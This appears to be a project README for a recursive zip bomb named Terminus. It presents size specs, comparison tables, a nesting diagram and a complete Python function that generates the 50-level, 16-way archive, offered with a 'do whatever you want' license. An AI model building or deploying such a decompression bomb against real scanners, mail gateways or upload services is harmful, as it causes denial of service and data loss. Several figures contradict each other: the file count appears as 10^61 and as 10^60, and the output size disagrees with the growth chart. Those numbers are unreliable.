# TERMINUS

```
████████╗███████╗██████╗ ███╗   ███╗██╗███╗   ██╗██╗   ██╗███████╗
╚══██╔══╝██╔════╝██╔══██╗████╗ ████║██║████╗  ██║██║   ██║██╔════╝
   ██║   █████╗  ██████╔╝██╔████╔██║██║██╔██╗ ██║██║   ██║███████╗
   ██║   ██╔══╝  ██╔══██╗██║╚██╔╝██║██║██║╚██╗██║██║   ██║╚════██║
   ██║   ███████╗██║  ██║██║ ╚═╝ ██║██║██║ ╚████║╚██████╔╝███████║
   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝
```

**RECURSIVE ZIP BOMB**

493 KB compressed -> 6.91 x 10^61 bytes output

---

## what is this

a recursive zip bomb. fits on a floppy disk compressed, fills the observable universe uncompressed.

built on the 42.zip algorithm. level 50, branching factor 16, 43-byte payload.

---

## DO NOT EXTRACT

```
+-----------------------------------------------------------------------+
|                                                                       |
|   Terminus.zip creates 1.6 x 10^61 files                             |
|   Requires 6.91 x 10^61 bytes of disk space                          |
|   Your system WILL crash. Your data WILL be lost.                     |
|                                                                       |
|   This is a research artifact. Don't be stupid with it.               |
|                                                                       |
+-----------------------------------------------------------------------+
```

---

## specs

```
+------------------+----------------------------------------------------+
| FILE             | Terminus.zip                                       |
| SIZE             | 493.60 KB (505,446 bytes)                         |
| SHA256           | 3ba1761a...cd96dd96                                |
| FILES INSIDE     | 16 (bomb_0000.zip - bomb_0015.zip)                |
| EACH INNER       | ~30.75 KiB (all identical)                         |
| TOTAL FILES      | 1,606,938,044,258,990,275,541,962,092,341,      |
|                  | 162,602,522,202,993,782,792,835,301,376           |
| DIGITS           | 61                                                 |
| OUTPUT SIZE      | 6.91 x 10^61 bytes                                |
| RATIO            | 1 : 1.37 x 10^56                                  |
| BUILD TIME       | 0.36 seconds                                       |
+------------------+----------------------------------------------------+
```

---

## comparisons

```
+-------------------------------+----------------+------------------+
| Reference                     | Size           | vs Terminus      |
+-------------------------------+----------------+------------------+
| Wikipedia English             | ~20 GB         | 3.22 x 10^51 x  |
| Entire Internet               | ~120 ZB        | 4.88 x 10^38 x  |
| Stars in Observable Universe  | ~10^24         | 6.22 x 10^36 x  |
| Grains of Sand on Earth       | ~7.5 x 10^18   | 2.14 x 10^42 x  |
| Cells in Human Body           | ~3.7 x 10^13   | 4.34 x 10^47 x  |
| Atoms in Observable Universe  | ~10^80         | 6.22 x 10^-20 x |
+-------------------------------+----------------+------------------+
```

atoms in the universe still win. but barely.

---

## how it works

```
  LEVEL 0                LEVEL 1                LEVEL 2
+----------+        +--------------+      +----------------------+
| data.bin |        | bomb_0000.zip|      | bomb_0000.zip        |
| (43 B)   |  =>    | bomb_0001.zip|  =>  |  +-- bomb_0000.zip   |
+----------+        | ...          |      |  +-- bomb_0001.zip   |
   120 B zip        | bomb_0015.zip|      |  +-- ...             |
                    | (16 copies)  |      | bomb_0001.zip        |
                    +--------------+      |  +-- bomb_0000.zip   |
                       2.72 KB zip        |  +-- ...             |
                                          +----------------------+
                                             6.43 KB zip

                    ... repeat 50 times ...

  OUTPUT: 16^50 files = 1.6 x 10^60 files = 6.91 x 10^61 bytes
```

the trick: zip size grows ~8KB per level (linear). output multiplies by 16 per level (exponential).

---

## growth chart

```
Level  Zip Size     Output              Bar
-----  -----------  ------------------  -------------------------------------------
   0   120.00 B     43 B                |
   5    22.40 KB    43 MB               ###![image](file-service://file-E8xGJmU2d5XHv2h8hF6d7g)
  10    58.35 KB    43 TB               #########
  15    96.68 KB    43 EB               ################
  20   136.51 KB    43 YB               ########################
  30   231.44 KB    4.62e13 YB          ##############################################
  40   336.19 KB    5.08e19 YB          ##############################################
  50   493.60 KB    5.72e37 YB          ##############################################
```

---

## verify

```bash
# check size
ls -lh Terminus.zip

# verify hash
shasum -a 256 Terminus.zip
# expected: 3ba1761a515b1a66f8322e5d4481d69d8a43bc9fa748e751d05327e9cd96dd96

# list contents (safe - don't extract)
zipinfo Terminus.zip
```

---

## simulation

```bash
# interactive mode
python3 terminus_sim.py

# cli mode
python3 terminus_sim.py 16 50 43
```

no files created. just math.

---

## rebuild

```python
import zipfile, io

def create_level(depth, branching=16, payload=43):
    if depth == 0:
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("data.bin", b'\x00' * payload)
        return buf.getvalue()
    inner = create_level(depth - 1, branching, payload)
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
        for i in range(branching):
            zf.writestr(f"bomb_{i:04d}.zip", inner)
    return buf.getvalue()

with open("Terminus.zip", "wb") as f:
    f.write(create_level(50))
```

---

## files

```
Terminus.zip         the bomb
terminus_sim.py      safe simulator
README.md            this file
docs/
  ARCHITECTURE.md    how the recursion works
  BENCHMARKS.md      performance data
  TECHNICAL.md       algorithm deep dive
  CHANGELOG.md       version history
```

---

## license

do whatever you want. don't blame me if you extract it.
